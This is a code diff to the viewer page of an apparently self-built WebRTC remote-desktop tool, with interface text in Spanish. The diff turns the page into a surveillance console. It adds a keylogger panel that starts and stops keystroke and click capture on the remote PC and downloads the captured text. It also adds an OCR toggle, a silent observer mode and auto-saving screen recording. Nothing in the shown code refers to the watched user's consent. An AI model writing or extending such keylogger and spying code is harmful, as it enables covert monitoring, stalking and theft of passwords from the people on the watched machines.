+  socket = io(SIGNAL_URL, { transports: ["polling"] });
 
   socket.on("connect", () => {
-    setStatus("Buscando host…", "info");
-    socket.emit("viewer:join");
+    socket.emit("viewer:join", {
+      name:         selectedPC.name,
+      passwordHash: selectedPC.passwordHash,
+    });
   });
 
   socket.on("connect_error", () => {
-    backToConnect("No se pudo conectar al servidor.", "error");
+    setModeStatus("No se pudo conectar al servidor.", "error");
+    document.getElementById("do-connect-btn").disabled = false;
   });
 
-  // Host no disponible aún — esperar
-  socket.on("viewer:waiting", () => {
-    setStatus("Esperando que el host se conecte…", "waiting");
-  });
-
-  // Host disponible → arrancar WebRTC
-  socket.on("viewer:ready", () => {
-    connectingScreen.style.display = "none";
-    remoteScreen.style.display     = "flex";
+  socket.on("viewer:ready", ({ name }) => {
+    document.getElementById("nav-pc-name").textContent = name;
+    updateModeUI();
+    showScreen("screen-remote");
     initPeerConnection();
+  });
+
+  socket.on("keylog:key", ({ char, ts, kind }) => {
+    if (!keylogActive) return;
+    keyCount++;
+    document.getElementById("key-counter").textContent = `${keyCount} evento${keyCount!==1?"s":""} capturado${keyCount!==1?"s":""}`;
+    if (ts && ts !== lastLogTs) { lastLogTs = ts; appendLog(`\n[${ts}] `, "timestamp"); }
+    if (kind === "click")                             appendLog(char, "click");
+    else if (char === "\n")                           appendLog("↵\n", "newline");
+    else if (char.startsWith("[") && char.endsWith("]")) appendLog(char, "special");
+    else                                              appendLog(char, "normal");
   });
 
   socket.on("signal:offer", async ({ offer }) => {
     if (!pc) return;
-    await pc.setRemoteDescription(new RTCSessionDescription(offer));
-    const answer = await pc.createAnswer();
-    await pc.setLocalDescription(answer);
-    socket.emit("signal:answer", { answer });
+    try {
+      await pc.setRemoteDescription(new RTCSessionDescription(offer));
+      const answer = await pc.createAnswer();
+      await pc.setLocalDescription(answer);
+      socket.emit("signal:answer", { answer });
+    } catch(e) { console.error(e); }
   });
 
   socket.on("signal:ice", async ({ candidate }) => {
     if (!pc || !candidate) return;
     try { await pc.addIceCandidate(new RTCIceCandidate(candidate)); }
-    catch (e) { console.warn("ICE:", e); }
+    catch(e) { console.warn(e); }
   });
 
   socket.on("error", ({ message }) => {
-    backToConnect(message, "error");
+    if (document.getElementById("screen-mode").classList.contains("active")) {
+      setModeStatus(message, "error");
+      document.getElementById("do-connect-btn").disabled = false;
+    } else {
+      disconnect(message);
+    }
   });
-});
+}
 
-// ── WebRTC ───────────────────────────────────────────────────────
+function setModeStatus(msg, type) {
+  const st = document.getElementById("mode-status");
+  st.textContent = msg; st.className = `status-msg status-${type}`;
+}
+
+function updateModeUI() {
+  const vc = document.getElementById("video-container");
+  const mb = document.getElementById("nav-mode-badge");
+  const co = document.getElementById("observer-overlay");
+  const cd = document.getElementById("cursor-dot");
+  if (controlMode) {
+    vc.className = "video-container control-mode";
+    mb.textContent = "Control"; mb.className = "nav-badge badge-control";
+    cd.style.display = "block"; co.style.display = "none";
+  } else {
+    vc.className = "video-container observer-mode";
+    mb.textContent = "Observador"; mb.className = "nav-badge badge-observer";
+    cd.style.display = "none"; co.style.display = "block";
+  }
+}
+
+// ── WebRTC ────────────────────────────────────────────────────────
 function initPeerConnection() {
   pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
-
-  pc.onicecandidate = ({ candidate }) => {
-    if (candidate) socket.emit("signal:ice", { candidate });
-  };
-
+  pc.onicecandidate = ({ candidate }) => { if (candidate) socket.emit("signal:ice", { candidate }); };
   pc.ontrack = ({ track, streams }) => {
     if (track.kind === "video" && streams[0]) {
-      remoteVideo.srcObject = streams[0];
-      remoteVideo.onloadedmetadata = () => {
-        loadingOverlay.style.display = "none";
+      document.getElementById("remote-video").srcObject = streams[0];
+      document.getElementById("remote-video").onloadedmetadata = () => {
+        document.getElementById("loading-overlay").style.display = "none";
       };
     }
   };
-
+  // ── FIX 2: "disconnected" es transitorio, solo cortar en "failed" o "closed"
   pc.onconnectionstatechange = () => {
-    if (["disconnected","failed","closed"].includes(pc.connectionState)) {
-      backToConnect("La conexión se interrumpió.", "error");
+    console.log("WebRTC state:", pc.connectionState);
+    if (["failed", "closed"].includes(pc.connectionState)) {
+      disconnect("La conexión se interrumpió.");
     }
   };
 }
 
-// ── Disconnect ───────────────────────────────────────────────────
-disconnectBtn.addEventListener("click", () => backToConnect("Desconectado.", "info"));
-
-// ── Input relay ──────────────────────────────────────────────────
-function getRect()  { return remoteVideo.getBoundingClientRect(); }
-
-function toHost(cx, cy) {
-  const r = getRect();
-  return {
-    x: Math.round((cx - r.left) * (remoteVideo.videoWidth  / r.width)),
-    y: Math.round((cy - r.top)  * (remoteVideo.videoHeight / r.height)),
-  };
+function disconnect(msg = "") {
+  if (recActive) stopRecording();
+  if (keylogActive) { keylogActive = false; updateKeylogUI(); }
+  if (pc)     { pc.close(); pc = null; }
+  if (socket) { socket.disconnect(); socket = null; }
+  document.getElementById("remote-video").srcObject = null;
+  document.getElementById("loading-overlay").style.display = "flex";
+  document.getElementById("do-connect-btn").disabled = false;
+  if (msg) setModeStatus(msg, "error");
+  showScreen("screen-select");
 }
 
-function overVideo(cx, cy) {
-  const r = getRect();
-  return cx >= r.left && cx <= r.right && cy >= r.top && cy <= r.bottom;
+// ── Tabs ──────────────────────────────────────────────────────────
+document.querySelectorAll(".panel-tab").forEach(tab => {
+  tab.addEventListener("click", () => {
+    document.querySelectorAll(".panel-tab").forEach(t => t.classList.remove("active"));
+    document.querySelectorAll(".panel-content").forEach(c => c.classList.remove("active"));
+    tab.classList.add("active");
+    document.getElementById(`tab-${tab.dataset.tab}`).classList.add("active");
+  });
+});
+
+// ── Keylogger ─────────────────────────────────────────────────────
+document.getElementById("keylog-toggle-btn").addEventListener("click", () => {
+  if (!socket) return;
+  keylogActive = !keylogActive;
+  socket.emit(keylogActive ? "keylog:start" : "keylog:stop");
+  if (keylogActive && !logInitialized) { document.getElementById("panel-log").innerHTML = ""; logInitialized = true; }
+  if (keylogActive)  appendLog("[▶ Keylogger iniciado]\n", "special");
+  else               appendLog("\n[■ Keylogger detenido]\n", "special");
+  updateKeylogUI();
+});
+
+function updateKeylogUI() {
+  const btn = document.getElementById("keylog-toggle-btn");
+  const badge = document.getElementById("nav-keylog-badge");
+  btn.textContent = keylogActive ? "Detener" : "Activar";
+  btn.className   = keylogActive ? "panel-action-btn btn-err-outline" : "panel-action-btn btn-warn-outline";
+  badge.style.display = keylogActive ? "inline" : "none";
 }
 
-function send(data) { if (socket) socket.emit("input:event", data); }
-
-videoContainer.addEventListener("mousemove", (e) => {
-  const cr = videoContainer.getBoundingClientRect();
-  cursorDot.style.left = `${e.clientX - cr.left}px`;
-  cursorDot.style.top  = `${e.clientY - cr.top}px`;
-  if (!overVideo(e.clientX, e.clientY)) return;
-  const { x, y } = toHost(e.clientX, e.clientY);
-  send({ type: "mousemove", x, y });
+// ── OCR toggle ────────────────────────────────────────────────────
+document.getElementById("ocr-toggle").addEventListener("change", (e) => {
+  if (!socket) return;
+  socket.emit("keylog:ocr_toggle", { enabled: e.target.checked });
 });
 
-videoContainer.addEventListener("mousedown", (e) => {
-  if (!overVideo(e.clientX, e.clientY)) return;
-  e.preventDefault();
-  send({ type: "mousedown", button: e.button, ...toHost(e.clientX, e.clientY) });
+function appendLog(text, type = "normal") {
+  const span = document.createElement("span");
+  span.className = {
+    special: "log-special", newline: "log-newline",
+    timestamp: "log-timestamp", click: "log-click"
+  }[type] || "log-normal";
+  span.textContent = text;
+  const log = document.getElementById("panel-log");
+  log.appendChild(span);
+  log.scrollTop = log.scrollHeight;
+  keylogText += text;
+}
+
+document.getElementById("clear-btn").addEventListener("click", () => {
+  document.getElementById("panel-log").innerHTML = "";
+  keylogText = ""; keyCount = 0; logInitialized = false; lastLogTs = null;
+  document.getElementById("key-counter").textContent = "0 eventos capturados";
+  if (!keylogActive) document.getElementById("panel-log").innerHTML = '<span class="log-empty">Keylogger inactivo.</span>';
 });
 
-videoContainer.addEventListener("mouseup", (e) => {
-  if (!overVideo(e.clientX, e.clientY)) return;
-  e.preventDefault();
-  send({ type: "mouseup", button: e.button, ...toHost(e.clientX, e.clientY) });
+document.getElementById("download-keylog-btn").addEventListener("click", () => {
+  if (!keylogText) return;
+  const ts = new Date().toISOString().replace(/[:.]/g,"-").slice(0,19);
+  downloadBlob(new Blob([keylogText], {type:"text/plain;charset=utf-8"}), `keylog_${ts}.txt`);
 });
 
-videoContainer.addEventListener("click", (e) => {
-  if (!overVideo(e.clientX, e.clientY)) return;
-  e.preventDefault();
-  send({ type: "click", button: e.button, ...toHost(e.clientX, e.clientY) });
+// ── Grabación ─────────────────────────────────────────────────────
+document.getElementById("rec-toggle-btn").addEventListener("click", () => {
+  recActive ? stopRecording() : startRecording();
 });
 
-videoContainer.addEventListener("dblclick", (e) => {
-  if (!overVideo(e.clientX, e.clientY)) return;
-  e.preventDefault();
-  send({ type: "dblclick", ...toHost(e.clientX, e.clientY) });
-});
+function startRecording() {
+  const video = document.getElementById("remote-video");
+  if (!video.srcObject) return;
+  const mimeType = ["video/webm;codecs=vp9","video/webm;codecs=vp8","video/webm"]
+    .find(m => MediaRecorder.isTypeSupported(m)) || "video/webm";
+  try { mediaRecorder = new MediaRecorder(video.srcObject, { mimeType, videoBitsPerSecond: 2_500_000 }); }
+  catch { mediaRecorder = new MediaRecorder(video.srcObject); }
+  recChunks = [];
+  mediaRecorder.ondataavailable = e => { if (e.data?.size > 0) recChunks.push(e.data); };
+  mediaRecorder.onstop = saveRecording;
+  mediaRecorder.start(1000);
+  recActive = true; recStartTime = Date.now();
+  document.getElementById("rec-toggle-btn").textContent = "⏹ Detener grabación";
+  document.getElementById("rec-toggle-btn").className = "stop";
+  document.getElementById("rec-indicator").classList.add("active");
+  document.getElementById("rec-label").textContent = "Grabando…";
+  document.getElementById("rec-next").style.display = "inline";
+  document.getElementById("nav-rec-badge").style.display = "inline";
+  recTimerInterval = setInterval(updateRecTimer, 1000);
+  recSaveInterval  = setInterval(() => {
+    if (mediaRecorder?.state === "recording") {
+      mediaRecorder.stop();
+      setTimeout(() => { recChunks = []; mediaRecorder.start(1000); }, 200);
+    }
+  }, REC_INTERVAL_MS);
+}
 
-videoContainer.addEventListener("contextmenu", (e) => {
-  if (!overVideo(e.clientX, e.clientY)) return;
-  e.preventDefault();
-  send({ type: "contextmenu", ...toHost(e.clientX, e.clientY) });
-});
+function stopRecording() {
+  if (mediaRecorder?.state !== "inactive") mediaRecorder.stop();
+  clearInterval(recTimerInterval); clearInterval(recSaveInterval);
+  recActive = false;
+  document.getElementById("rec-toggle-btn").textContent = "⏺ Iniciar grabación";
+  document.getElementById("rec-toggle-btn").className = "start";
+  document.getElementById("rec-indicator").classList.remove("active");
+  document.getElementById("rec-label").textContent = "Grabación detenida";
+  document.getElementById("rec-next").style.display = "none";
+  document.getElementById("nav-rec-badge").style.display = "none";
+  document.getElementById("rec-timer").textContent = "00:00:00";
+}
 
-videoContainer.addEventListener("wheel", (e) => {
-  e.preventDefault();
-  send({ type: "scroll", deltaX: e.deltaX, deltaY: e.deltaY });
-}, { passive: false });
+function saveRecording() {
+  if (!recChunks.length) return;
+  const blob = new Blob(recChunks, { type:"video/webm" });
+  const ts   = new Date().toISOString().replace(/[:.]/g,"-").slice(0,19);
+  const name = `grabacion_${ts}.webm`;
+  savedFiles.unshift({ name, blob, sizeMB: (blob.size/1024/1024).toFixed(1) });
+  renderFileList(); downloadBlob(blob, name);
+}
 
-document.addEventListener("keydown", (e) => {
-  if (remoteScreen.style.display === "none") return;
-  if (e.key === "F12") return;
-  e.preventDefault();
-  send({ type:"keydown", key:e.key, code:e.code,
-         ctrlKey:e.ctrlKey, shiftKey:e.shiftKey, altKey:e.altKey, metaKey:e.metaKey });
-});
+function renderFileList() {
+  const el = document.getElementById("rec-files-list");
+  if (!savedFiles.length) { el.innerHTML = '<div class="rec-empty">Ningún archivo guardado aún.</div>'; return; }
+  el.innerHTML = savedFiles.map((f,i) => `
+    <div class="rec-file-item">
+      <div>🎬</div>
+      <div class="rec-file-info">
+        <div class="rec-file-name">${f.name}</div>
+        <div class="rec-file-meta">${f.sizeMB} MB</div>
+      </div>
+      <button class="rec-file-dl" data-idx="${i}">↓</button>
+    </div>
+  `).join("");
+  el.querySelectorAll(".rec-file-dl").forEach(btn => {
+    btn.addEventListener("click", () => {
+      const f = savedFiles[parseInt(btn.dataset.idx)];
+      downloadBlob(f.blob, f.name);
+    });
+  });
+}
 
-document.addEventListener("keyup", (e) => {
-  if (remoteScreen.style.display === "none") return;
-  if (e.key === "F12") return;
-  e.preventDefault();
-  send({ type:"keyup", key:e.key, code:e.code,
-         ctrlKey:e.ctrlKey, shiftKey:e.shiftKey, altKey:e.altKey, metaKey:e.metaKey });
+function updateRecTimer() {
+  if (!recStartTime) return;
+  const e = Math.floor((Date.now()-recStartTime)/1000);
+  document.getElementById("rec-timer").textContent =
+    [Math.floor(e/3600), Math.floor((e%3600)/60), e%60]
+    .map(n => String(n).padStart(2,"0")).join(":");
+  const next = REC_INTERVAL_MS - ((Date.now()-recStartTime) % REC_INTERVAL_MS);
+  const nm = String(Math.floor(next/60000)).padStart(2,"0");
+  const ns = String(Math.floor((next%60000)/1000)).padStart(2,"0");
+  document.getElementById("rec-next").textContent = `Próximo guardado: ${nm}:${ns}`;
+}
+
+// ── Input relay ───────────────────────────────────────────────────
+let lastMouseSent=0, pendingMove=null, moveTimer=null;
+
+function throttledMove(x,y) {
+  const now = Date.now();
+  if (now-lastMouseSent >= MOUSE_THROTTLE_MS) {
+    lastMouseSent=now; sendInput({type:"mousemove",x,y}); pendingMove=null;
+    if (moveTimer){clearTimeout(moveTimer);moveTimer=null;}
+  } else {
+    pendingMove={x,y};
+    if (!moveTimer) moveTimer=setTimeout(()=>{
+      if(pendingMove){sendInput({type:"mousemove",...pendingMove});lastMouseSent=Date.now();pendingMove=null;}
+      moveTimer=null;
+    },MOUSE_THROTTLE_MS);
+  }
+}
+
+const vc = document.getElementById("video-container");
+const rv = document.getElementById("remote-video");
+
+function toHost(cx,cy){const r=rv.getBoundingClientRect();return{x:Math.round((cx-r.left)*(rv.videoWidth/r.width)),y:Math.round((cy-r.top)*(rv.videoHeight/r.height))};}
+function overVideo(cx,cy){const r=rv.getBoundingClientRect();return cx>=r.left&&cx<=r.right&&cy>=r.top&&cy<=r.bottom;}
+function sendInput(data){if(!socket||!controlMode)return;socket.emit("input:event",data);}
+
+vc.addEventListener("mousemove",e=>{
+  if(!controlMode)return;
+  const cr=vc.getBoundingClientRect();
+  document.getElementById("cursor-dot").style.left=`${e.clientX-cr.left}px`;
+  document.getElementById("cursor-dot").style.top=`${e.clientY-cr.top}px`;
+  if(!overVideo(e.clientX,e.clientY))return;
+  const{x,y}=toHost(e.clientX,e.clientY);throttledMove(x,y);
 });
+vc.addEventListener("mousedown",e=>{if(!controlMode||!overVideo(e.clientX,e.clientY))return;e.preventDefault();sendInput({type:"mousedown",button:e.button,...toHost(e.clientX,e.clientY)});});
+vc.addEventListener("mouseup",e=>{if(!controlMode||!overVideo(e.clientX,e.clientY))return;e.preventDefault();sendInput({type:"mouseup",button:e.button,...toHost(e.clientX,e.clientY)});});
+vc.addEventListener("click",e=>{if(!controlMode||!overVideo(e.clientX,e.clientY))return;e.preventDefault();sendInput({type:"click",button:e.button,...toHost(e.clientX,e.clientY)});});
+vc.addEventListener("dblclick",e=>{if(!controlMode||!overVideo(e.clientX,e.clientY))return;e.preventDefault();sendInput({type:"dblclick",...toHost(e.clientX,e.clientY)});});
+vc.addEventListener("contextmenu",e=>{if(!controlMode||!overVideo(e.clientX,e.clientY))return;e.preventDefault();sendInput({type:"contextmenu",...toHost(e.clientX,e.clientY)});});
+vc.addEventListener("wheel",e=>{if(!controlMode)return;e.preventDefault();sendInput({type:"scroll",deltaX:e.deltaX,deltaY:e.deltaY});},{passive:false});
+document.addEventListener("keydown",e=>{if(!controlMode||!document.getElementById("screen-remote").classList.contains("active"))return;if(e.key==="F12")return;e.preventDefault();sendInput({type:"keydown",key:e.key,code:e.code,ctrlKey:e.ctrlKey,shiftKey:e.shiftKey,altKey:e.altKey,metaKey:e.metaKey});});
+document.addEventListener("keyup",e=>{if(!controlMode||!document.getElementById("screen-remote").classList.contains("active"))return;if(e.key==="F12")return;e.preventDefault();sendInput({type:"keyup",key:e.key,code:e.code,ctrlKey:e.ctrlKey,shiftKey:e.shiftKey,altKey:e.altKey,metaKey:e.metaKey});});
+
+// ── Utils ──────────────────────────────────────────────────────────
+function downloadBlob(blob,filename){const u=URL.createObjectURL(blob),a=document.createElement("a");a.href=u;a.download=filename;a.click();setTimeout(()=>URL.revokeObjectURL(u),5000);}
 </script>
 </body>
 </html>
